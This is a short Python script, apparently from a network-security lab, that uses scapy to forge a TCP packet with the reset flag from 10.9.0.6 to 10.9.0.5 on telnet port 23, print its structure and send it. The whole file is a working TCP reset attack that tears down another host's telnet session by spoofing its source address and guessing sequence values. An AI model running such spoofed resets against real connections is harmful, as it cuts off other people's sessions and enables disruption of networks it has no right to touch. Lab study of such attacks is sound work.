#!/usr/bin/env python3
from scapy.all import *

# Create the IP and TCP layers
ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=37742, dport=23, flags="R", seq="89", ack=10)
pkt = ip/tcp

# Display packet structure
ls(pkt)

# Send the packet
send(pkt, verbose=0)
